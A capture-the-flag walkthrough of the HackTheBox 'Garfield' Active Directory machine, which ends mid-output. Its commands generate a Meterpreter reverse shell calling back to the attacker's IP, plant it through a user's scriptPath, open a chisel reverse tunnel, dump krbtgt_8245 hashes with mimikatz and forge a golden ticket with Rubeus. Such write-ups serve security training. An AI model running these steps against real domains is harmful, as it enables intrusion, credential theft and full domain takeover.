# Garfield

Garfield is a Hard level machine in HackTheBox. We begin with writing a batch file to a sensitive share directory, changing a user's scriptPath to execute the batch file and get a reverse shell, and finally password and attribute changes that lead to a Golden Ticket attack. We will also need to set up a Chisel SOCK connection to access the read-only domain controller. Let's dig into this lasagna. 

## Nmap 

```
└─$ nmap -T4 -p53,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5985,9389 10.129.77.197 -sC -sV -A
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-30 08:10 EDT
Nmap scan report for 10.129.77.197
Host is up (0.031s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-30 20:10:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-10-30T20:11:47+00:00; +8h00m04s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-30T20:11:06+00:00
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-10-29T20:05:18
|_Not valid after:  2027-04-30T20:05:18
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-30T20:11:10
|_  start_date: N/A
|_clock-skew: mean: 8h00m03s, deviation: 0s, median: 8h00m03s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   32.47 ms 10.10.14.1
2   32.61 ms 10.129.77.197

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.91 seconds

```

We have both the domain and DC, so let's add them to our /etc/hosts file.

# User Access
We start with the provided credentials:
*j.arbuckle / Th1sD4mnC4t!@1978*

Let's take a look and see what j.arbuckle can access or do:

```
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ nxc ldap garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users

LDAP        10.129.77.197   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.77.197   389    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
LDAP        10.129.77.197   389    DC01             [*] Enumerated 7 domain users: garfield.htb
LDAP        10.129.77.197   389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.77.197   389    DC01             Administrator                 2025-10-03 13:29:26 0        Built-in account for administering the computer/domain      
LDAP        10.129.77.197   389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.77.197   389    DC01             krbtgt                        2025-08-13 07:05:26 0        Key Distribution Center Service Account                     
LDAP        10.129.77.197   389    DC01             krbtgt_8245                   2025-08-17 07:33:39 0        Key Distribution Center service account for read-only domain controller
LDAP        10.129.77.197   389    DC01             j.arbuckle                    2025-09-09 11:50:55 0                                                                    
LDAP        10.129.77.197   389    DC01             l.wilson                      2026-01-27 16:40:33 0                                                                    
LDAP        10.129.77.197   389    DC01             l.wilson_adm                  2026-01-13 09:56:35 2                                             
```

We see we have two l.wilson accounts (a regular and an admin account), and 2 krbtgt accounts (krbtgt and krbtgt_8245). Interesting. Let's look at the shares. 

```
└─$ nxc smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
SMB         10.129.77.197   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.77.197   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SMB         10.129.77.197   445    DC01             [*] Enumerated shares
SMB         10.129.77.197   445    DC01             Share           Permissions     Remark
SMB         10.129.77.197   445    DC01             -----           -----------     ------
SMB         10.129.77.197   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.77.197   445    DC01             C$                              Default share
SMB         10.129.77.197   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.77.197   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.77.197   445    DC01             SYSVOL          READ            Logon server share 

```

We have read access to IPC$, NETLOGON, and SYSVOL. We should look into these.

```
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ smbclient //garfield.htb/NETLOGON -U j.arbuckle%'Th1sD4mnC4t!@1978'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 27 17:13:47 2026
  ..                                  D        0  Tue Jan 27 17:13:47 2026
  printerDetect.bat                   A      217  Fri Sep 12 18:20:29 2025

                9250815 blocks of size 4096. 971240 blocks available

```
Let's see what's in this .bat file. 

```
smb: \> get printerDetect.bat 
getting file \printerDetect.bat of size 217 as printerDetect.bat (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ cat printerDetect.bat 
@echo off
echo Detecting installed printers...
echo ==============================

wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table

echo.
echo Printer detection completed.
pause                                                                                                                    
```

Nothing really useful, but the fact it is there means something must be calling it. We'll come back to this later. 

We look at SYSVOL and find the same .bat file in the scripts directory. 

Let's see what write permissions we have:

```
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Hacks/garfield]                                                                                                                                                                                 
└─$ bloodyad -H garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable --detail                                                                                                                    ...

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

```

We can edit the scriptPath for both of these accounts. We learn from [this article](https://happycamper84.medium.com/the-scriptpath-attribute-another-incredibly-arcane-windows-privilege-5bf4f3dcd8c4) that this attribute points to something to be executed when the user logs in. This script sits in the NETLOGON share. 

We generate a reverse shell and set up a listener

```
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.108 LPORT=1313 -f psh-cmd > shell.bat
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of psh-cmd file: 7495 bytes

...


msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.14.108
LHOST => 10.10.14.108
msf exploit(multi/handler) > set LPORT 1313
LPORT => 1313
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.108:1313 

```

Now, let's change see if we can upload our shell.bat file to the server. NETLOGON is READ only, but maybe SYSVOL's script directory is writable

```
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ smbclient //garfield.htb/SYSVOL -U j.arbuckle%'Th1sD4mnC4t!@1978'
Try "help" to get a list of possible commands.
smb: \> cd garfield.htb\scripts\
smb: \garfield.htb\scripts\> put shell.bat
putting file shell.bat as \garfield.htb\scripts\shell.bat (79.6 kB/s) (average 79.6 kB/s)
smb: \garfield.htb\scripts\> 

```
Looks like our shell was successfully loaded. Let's change the scriptPath for each of the users and see which one grants us a shell.

```
                                                                                                                                                                
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ bloodyad -H garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object 'l.wilson' scriptPath -v shell.bat
[+] l.wilson's scriptPath has been updated
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ bloodyad -H garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object 'l.wilson_adm' scriptPath -v shell.bat
[+] l.wilson_adm's scriptPath has been updated
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ bloodyad -H garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object 'krbtgt_8245' scriptPath -v shell.bat
[+] krbtgt_8245's scriptPath has been updated

```

And voila, we get a reverse shell. It looks like our victim is l.wilson. 

```
[*] Meterpreter session 1 opened (10.10.14.108:1313 -> 10.129.77.197:55318) at 2026-10-30 08:36:03 -0400

meterpreter > getuid
Server username: GARFIELD\l.wilson
meterpreter > 
```

We look around at what is readable in the server but find nothing with credentials to exploit. We check privileges and find nothing interesting. Let's use powerview to see what rights this user has on other users. We will need to upload it to l.wilson's Documents. 

```
meterpreter > upload powerview.ps1
[*] Uploading  : /home/kali/Hacks/garfield/powerview.ps1 -> powerview.ps1
[*] Uploaded 891.68 KiB of 891.68 KiB (100.0%): /home/kali/Hacks/garfield/powerview.ps1 -> powerview.ps1
[*] Completed  : /home/kali/Hacks/garfield/powerview.ps1 -> powerview.ps1
meterpreter > load powershell
meterpreter > powershell_import powerview.ps1                                                                                                                                
[+] File successfully imported. No result was returned. 
meterpreter > powershell_execute "Get-DomainObjectAcl -RightsFilter ResetPassword"
[+] Command execution completed:


ObjectDN               : CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
ObjectSID              : S-1-5-21-2502726253-3859040611-225969357-1602
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-2502726253-3859040611-225969357-3107
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None

ObjectDN               : CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
ObjectSID              : S-1-5-21-2502726253-3859040611-225969357-1603
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-2502726253-3859040611-225969357-1602
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None

ObjectDN               : CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
ObjectSID              : S-1-5-21-2502726253-3859040611-225969357-3107
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-2502726253-3859040611-225969357-3105
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None

```

Looks like we can change the password for Liz Wilson Adm, RODC01$, and krbtgt_8245. Don't mind if I do.

```
meterpreter > powershell_execute "$NewPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force"
[+] Command execution completed:

meterpreter > powershell_execute "Set-ADAccountPassword -Identity 'l.wilson_adm' -NewPassword $NewPassword"
[+] Command execution completed:

```

We are only able to change l.wilson_adm's password. Let's learn more about this user.

```
$ bloodyad -H garfield.htb -u l.wilson_adm -p 'NewPassword123!' get object "l.wilson_adm"
...
memberOf: CN=Tier 1,CN=Users,DC=garfield,DC=htb; CN=Remote Management Users,CN=Builtin,DC=garfield,DC=htb; CN=Remote Desktop Users,CN=Builtin,DC=garfield,DC=htb

```

This user has remote desktop permissions. Let's WinRM into the host. 

```
evil-winrm -u 'l.wilson_adm' -p 'NewPassword123!' -i 10.129.77.197
                                        
...

*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> ls


    Directory: C:\Users\l.wilson_adm\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/30/2026   1:06 PM             34 user.txt

```

We have the user flag. 

# Getting root

Now that we have access to a more privileged account than j.arbuckle with credentials, let's take a look at the domain terrain. We will use bloodhound for this. 

```

┌──(kali㉿kali)-[~]
└─$ nxc ldap garfield.htb -u 'l.wilson_adm' -p 'NewPassword123!' --dns-server 10.129.77.197 -d garfield.htb --bloodhound -c All
LDAP        10.129.77.197   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.77.197   389    DC01             [+] garfield.htb\l.wilson_adm:NewPassword123! 
LDAP        10.129.77.197   389    DC01             Resolved collection methods: localadmin, dcom, psremote, objectprops, session, group, trusts, container, acl, rdp
LDAP        10.129.77.197   389    DC01             Done in 0M 9S
LDAP        10.129.77.197   389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.77.197_2026-10-30_090618_bloodhound.zip
                                                                                                         
┌──(kali㉿kali)-[~]

```
Upload the zip file to the bloodhound server. We see that l.wilson_adm has some interesting outbound controls:
* ForceChangePassword on RODC01$
* AddSelf on RODC Administrator Group

Let's go ahead and add ourselves to that group and change the password on RODC01$

```
──(kali㉿kali)-[~]
└─$ bloodyad -H garfield.htb -u l.wilson_adm -p 'NewPassword123!' add groupMember 'RODC Administrators' l.wilson_adm                                                          
[+] l.wilson_adm added to RODC Administrators
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ bloodyad -H garfield.htb -u l.wilson_adm -p 'NewPassword123!' set password 'RODC01$' 'password'                 
[+] Password changed successfully!

```

Finally, let's see what write permissions we have as l.wilson_adm

```
distinguishedName: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb                       
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE                                             
msDS-RevealOnDemandGroup: WRITE                                                             
msDS-NeverRevealGroup: WRITE                                                                
lastLogonTimestamp: WRITE                                                                   
managedBy: WRITE                                                                            
logonCount: WRITE                                                                           
accountExpires: WRITE                                                                       
profilePath: WRITE                                                                          
userParameters: WRITE                                                                       
pwdLastSet: WRITE                                                                           
userWorkstations: WRITE                                                                     
logonWorkstation: WRITE                                                                     
logonHours: WRITE                                                                           
scriptPath: WRITE                                                                           
lastLogon: WRITE                                                                            
lastLogoff: WRITE                                                                           
homeDrive: WRITE                                                                            
homeDirectory: WRITE                                                                        
badPwdCount: WRITE                                                                          
userAccountControl: WRITE       
```

We found our way forward. Being able to write these gives us:
* msDS-AllowedToActOnBehalfOfOtherIdentity - Give RBCD rights to a user on behalf of RODC01$. 
* msDS-RevealOnDemandGroup - Allows for passwords to be cached on the RODC
* msDS-NeverRevealGroup - Disallows for password to be cached on the RODC
* managedBy - Gives us Administrative access to the host
First, let's set up RBCD between l.wilson_adm and RODC01$

```
┌──(kali㉿kali)-[~]
└─$ bloodyad -H garfield.htb -u l.wilson_adm -p 'NewPassword123!' add rbcd 'RODC01$' 'l.wilson_adm' 
[!] No security descriptor has been returned, a new one will be created
[+] l.wilson_adm can now impersonate users on RODC01$ via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+pw://None\l.wilson_adm:NewPassword123%21@garfield.htb/?serverip=10.129.77.197' 'HOST/RODC01$@None' 'Administrator@None'

```

[This article](https://www.thehacker.recipes/ad/movement/dacl/rights-on-rodc-object) shows us how we can edit these attributes to enable a Golden Ticket attack.

```
──(kali㉿kali)-[~]
└─$ bloodyad -H garfield.htb -u l.wilson_adm -p 'NewPassword123!' set object "RODC01$" msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb' 
[+] RODC01$'s msDS-RevealOnDemandGroup has been updated

┌──(kali㉿kali)-[~]
└─$ bloodyad -H garfield.htb -u l.wilson_adm -p 'NewPassword123!' set object "RODC01$" msDS-NeverRevealGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb'                                        
[+] RODC01$'s msDS-NeverRevealGroup has been updated

─$ bloodyad -H garfield.htb -u l.wilson_adm -p 'NewPassword123!' set object 'RODC01$' managedBy -v 'CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb'
[+] RODC01$'s managedBy has been updated

```

Since we have access to the RODC, we will try to extract credentials from here first. We need to know if we can directly access it or if it's an internal host. 

```
┌──(kali㉿kali)-[~/Hacks/garfield]                                                                                                                         
└─$ bloodyad -H garfield.htb -u l.wilson_adm -p 'NewPassword123!' msldap dnsdump                                                                           
Writing DNS records to file dns_20261030-092628.tsv: 106it [00:00, 457.48it/s]                                                                             
                                                                                                                                                           
┌──(kali㉿kali)-[~/Hacks/garfield]                                                                                                                         
└─$ cat dns_20261030-092628.tsv         

...

└─$ nslookup RODC01.garfield.htb 10.129.77.197                          
Server:         10.129.77.197
Address:        10.129.77.197#53

Name:   RODC01.garfield.htb
Address: 192.168.100.2

```

It is internal, meaning we are going to have to set up a SOCKS tunnel to access it. We will use chisel for this. Upload chisel.exe onto the victim host under l.wilson_adm. 

```
On your host:
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ chisel server -p 1917 --reverse 
2026/10/30 09:29:46 server: Reverse tunnelling enabled
2026/10/30 09:29:46 server: Fingerprint eNF8rb0bqMbTp8uYGuWiuSftinxX9bwtbvU/Lqm6dsI=
2026/10/30 09:29:46 server: Listening on http://0.0.0.0:1917

On the victim:

Info: Upload successful!
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\chisel.exe client 10.10.14.108:1917 R:socks
chisel.exe : 2026/10/30 14:31:31 client: Connecting to ws://10.10.14.108:1917
    + CategoryInfo          : NotSpecified: (2026/10/30 14:3....10.14.108:1917:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2026/10/30 14:31:31 client: Connected (Latency 35.1897ms)

```

Now we are going to use proxychains4 to get a shell on RODC01.

```
┌──(kali㉿kali)-[~/Hacks/garfield]
└─$ proxychains4 evil-winrm -u 'l.wilson_adm' -p 'NewPassword123!' -i 192.168.100.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> 

```

Let's see if we can dump credentials using Mimikatz

```
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\mimikatz.exe "lsadump::secrets" "exit"
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::secrets
Domain : RODC01
SysKey : ERROR kuhl_m_lsadump_getSyskey ; LSA Key Class read error
ERROR kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO

mimikatz(commandline) # exit
Bye!
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:5985  ...  OK

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz(commandline) # lsadump::lsa /inject /name:krbtgt_8245
ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x00000005)
ERROR kuhl_m_lsadump_lsa ; SamConnect c0000022

mimikatz(commandline) # exit
Bye!
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> 

```
Nope. But maybe we can get SYSTEM to run it via Task Scheduler. Impacket has the perfect solution for this. Atexec essentially asks the Task Scheduler to run something as SYSTEM. Since we have the RODC01$ account's password, we can use it to get a ticket for Administrator

First let's test to make sure we can do this:

```
└─$ sudo ntpdate -u garfield.htb; proxychains4 impacket-atexec garfield.htb/l.wilson_adm:'NewPassword123!'@192.168.100.2 -dc-ip 10.129.77.197  'cmd /c whoami'           
2026-10-30 19:50:56.713296 (-0400) +28802.179590 +/- 0.019424 garfield.htb 10.129.77.197 s1 no-leap
CLOCK: time stepped by 28802.179590
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[*] Creating task \ytVJGrQQ
[*] Running task \ytVJGrQQ
[*] Deleting task \ytVJGrQQ
[*] Attempting to read ADMIN$\Temp\ytVJGrQQ.tmp
nt authority\system

```

Beautiful. We can get the krbtgt_8245 NT hash. We have system-level access because we changed RODC01's "managedBy" attribute to l.wilson_adm, effectively making this account a local admin.

```
─(kali㉿kali)-[~/Hacks/garfield]                                                                                                                         
└─$ sudo ntpdate -u garfield.htb; proxychains4 impacket-atexec garfield.htb/l.wilson_adm:'NewPassword123!'@192.168.100.2 -dc-ip 10.129.77.197  'cmd /c /Use
rs/l.wilson_adm/Documents/mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"'   

mimikatz(commandline) # lsadump::lsa /inject /name:krbtgt_8245
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2
    LM   : 
  Hash NTLM: 445aa4221e751da37a10241d962780e2
    ntlm- 0: 445aa4221e751da37a10241d962780e2
    lm  - 0: 0ab3d34a182bb016fc4cfd26544a9f16

 * WDigest
    01  6d31d1f92ef6d85f5517944f98bf5753
    02  8c46bd5ddc680291e70800990dbc02e3
    03  9ffbc24f29b9bb3df3c32b76631ff874
    04  6d31d1f92ef6d85f5517944f98bf5753
    05  8c46bd5ddc680291e70800990dbc02e3
    06  8fc97c500bf9c7c4a0d34a497f9c5245
    07  6d31d1f92ef6d85f5517944f98bf5753
    08  c4bac61b7ecb407d358f836d2f4e19c6
    09  c4bac61b7ecb407d358f836d2f4e19c6
    10  d8938c80e1e0c80a2ec1d8b06f42cb31
    11  67f002aa49f4400fa970a53e294f4bee
    12  c4bac61b7ecb407d358f836d2f4e19c6
    13  56062e2db43bc0069deb86de87509ca6
    14  67f002aa49f4400fa970a53e294f4bee
    15  7250fcfc09d9cb93345c0c1393e19e52
    16  7250fcfc09d9cb93345c0c1393e19e52
    17  04b30cd8b5381d4b8458b0c996503a91
    18  b48bda9ef98982d5ee33766a74880e01
    19  bb365cf4f0bcdadf35b6a9b04c58257b
    20  85addbd6d603cca1b500f2da02b205d0
    21  b6186618611e202aae4141716e6603f5
    22  b6186618611e202aae4141716e6603f5
    23  f3f6c9408db132bf8e59413b7b40bb16
    24  0acf88cc5cb3b35888708ebefe658b6f
    25  0acf88cc5cb3b35888708ebefe658b6f
    26  08b8941632a5017e7178a3761dfaf7fb
    27  c1b2fd89d0dafb5f9e18147042bdc433
    28  712f0b6ed3b7eb7f6f135a1e298c4e09
    29  bf8d51270f7f657079bb9744446d70cb

 * Kerberos
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Credentials
      des_cbc_md5       : d540fe6192b9ecfe

 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
      des_cbc_md5       (4096) : d540fe6192b9ecfe

 * NTLM-Strong-NTOWF
    Random Value : f4b51c2c0d006172304e31dbc6e0de6b

mimikatz(commandline) # exit

```

Now that we have the krbtgt_8245's NTLM and AES, let's use these to get a golden ticket on RODC01. 

```
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 10/30/2026 4:59:49 PM
[*] StartTime      : 10/30/2026 4:59:49 PM
[*] EndTime        : 10/31/2026 2:59:49 AM
[*] RenewTill      : 11/6/2026 3:59:49 PM

[*] base64(ticket.kirbi):

